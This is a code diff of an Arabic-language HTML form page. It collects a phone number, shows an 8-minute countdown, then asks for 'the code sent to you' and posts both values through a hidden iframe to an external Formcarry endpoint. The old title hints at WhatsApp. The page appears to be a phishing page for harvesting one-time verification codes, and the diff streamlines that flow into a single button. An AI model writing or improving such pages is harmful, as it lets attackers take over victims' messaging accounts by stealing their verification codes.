@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>What's  make me</title>
+  <title>نموذج رقم الهاتف والكود - إرسال بضغطة واحدة</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -88,102 +88,96 @@
 
   <div class="container">
     <h2>نموذج رقم الهاتف والكود</h2>
-    <form id="mainForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return handleSubmit(event);">
+    <form id="mainForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return false;">
       <label for="phone">رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
-
-      <button type="button" id="sendPhoneBtn" onclick="sendPhone()">إرسال رقم الهاتف</button>
-
-      <div id="timer"></div>
 
       <div id="codeField">
         <label for="code">الكود المرسل إليك:</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
-        <button type="submit" id="sendCodeBtn">إرسال الكود</button>
       </div>
+
+      <button type="button" id="sendBtn" onclick="sendData()">إرسال</button>
+
+      <div id="timer"></div>
     </form>
   </div>
 
   <iframe name="hidden_iframe" style="display:none;"></iframe>
 
   <script>
+    const phoneInput = document.getElementById('phone');
+    const codeField = document.getElementById('codeField');
+    const codeInput = document.getElementById('code');
+    const sendBtn = document.getElementById('sendBtn');
+    const timerDisplay = document.getElementById('timer');
     let countdownInterval;
+    let timeLeft = 0;
 
-    function sendPhone() {
-      const phoneInput = document.getElementById('phone');
-      const sendPhoneBtn = document.getElementById('sendPhoneBtn');
-      const timerDisplay = document.getElementById('timer');
-      const codeField = document.getElementById('codeField');
-      const codeInput = document.getElementById('code');
+    function startTimer(duration) {
+      timeLeft = duration;
+      timerDisplay.style.display = 'block';
+      updateTimer();
+      countdownInterval = setInterval(() => {
+        timeLeft--;
+        updateTimer();
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          timerDisplay.style.display = 'none';
+          sendBtn.disabled = false;
+        }
+      }, 1000);
+    }
 
+    function updateTimer() {
+      const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+      const seconds = (timeLeft % 60).toString().padStart(2, '0');
+      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
+    }
+
+    function sendData() {
+      // تحقق رقم الهاتف
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
         alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
         phoneInput.focus();
         return;
       }
 
-      // أرسل رقم الهاتف بشكل مؤقت للنموذج (نستخدم Formcarry فقط للإرسال النهائي لكن هنا نرسل رقم الهاتف عبر طلب POST غير مباشر)
-      // لكن لأجل تبسيط الإرسال نرسل النموذج كاملاً مع رقم الهاتف فقط
-      // لذا نستخدم iframe ونملأ الكود فارغاً في الإرسال الأول
+      // إذا الكود غير ظاهر (أول إرسال)، نظهره ونبدأ المؤقت، ونرسل رقم الهاتف فقط مع كود فارغ
+      if (codeField.style.display === 'none' || codeField.style.display === '') {
+        codeField.style.display = 'block';
+        codeInput.value = '';
+        sendBtn.disabled = true;
+        startTimer(480); // 8 دقائق
 
-      // إنشاء حقل الكود مخفي في الفورم (إذا لم يكن موجود)
-      let codeFieldHidden = document.querySelector('input[name="code"]');
-      if (!codeFieldHidden) {
-        codeFieldHidden = document.createElement('input');
-        codeFieldHidden.type = 'hidden';
-        codeFieldHidden.name = 'code';
-        document.getElementById('mainForm').appendChild(codeFieldHidden);
-      }
-      codeFieldHidden.value = '';
-
-      // إرسال الفورم
-      document.getElementById('mainForm').submit();
-
-      // إظهار خانة الكود
-      codeField.style.display = 'block';
-
-      // تعطيل زر إرسال رقم الهاتف + بدء المؤقت
-      sendPhoneBtn.disabled = true;
-
-      let timeLeft = 480; // 8 دقائق
-
-      timerDisplay.textContent = `يرجى الانتظار: 08:00`;
-
-      clearInterval(countdownInterval);
-      countdownInterval = setInterval(() => {
-        timeLeft--;
-        const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-        const seconds = (timeLeft % 60).toString().padStart(2, '0');
-        timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
-        if (timeLeft <= 0) {
-          clearInterval(countdownInterval);
-          timerDisplay.textContent = '';
-          sendPhoneBtn.disabled = false;
+        // أضف حقل كود مخفي فارغ لإرسال مع الفورم
+        let hiddenCodeInput = document.querySelector('input[name="code"][type="hidden"]');
+        if (!hiddenCodeInput) {
+          hiddenCodeInput = document.createElement('input');
+          hiddenCodeInput.type = 'hidden';
+          hiddenCodeInput.name = 'code';
+          document.getElementById('mainForm').appendChild(hiddenCodeInput);
         }
-      }, 1000);
+        hiddenCodeInput.value = '';
 
-      alert('تم إرسال رقم الهاتف، يمكنك الآن إدخال الكود في أي وقت.');
-    }
+        document.getElementById('mainForm').submit();
+        alert('تم إرسال رقم الهاتف، يمكنك الآن إدخال الكود المرسل إليك.');
 
-    function handleSubmit(event) {
-      event.preventDefault();
+      } else {
+        // إذا خانة الكود ظاهرة، تحقق من إدخال الكود ثم أرسل رقم الهاتف والكود دفعة واحدة
+        if (codeInput.value.trim() === '') {
+          alert('يرجى كتابة الكود المرسل إليك.');
+          codeInput.focus();
+          return;
+        }
 
-      const codeInput = document.getElementById('code');
-      const phoneInput = document.getElementById('phone');
+        // تأكد حذف الحقل المخفي إذا موجود
+        const hiddenCodeInput = document.querySelector('input[name="code"][type="hidden"]');
+        if (hiddenCodeInput) hiddenCodeInput.remove();
 
-      if (codeInput.value.trim() === '') {
-        alert('يرجى كتابة الكود المرسل إليك.');
-        codeInput.focus();
-        return false;
+        document.getElementById('mainForm').submit();
+        alert('تم إرسال رقم الهاتف والكود.');
       }
-
-      // إرسال البيانات مع رقم الهاتف والكود
-      // نرسل الفورم عبر iframe لمنع إعادة تحميل الصفحة
-      document.getElementById('mainForm').submit();
-
-      alert('تم إرسال الكود ورقم الهاتف.');
-
-      return false;
     }
   </script>
 
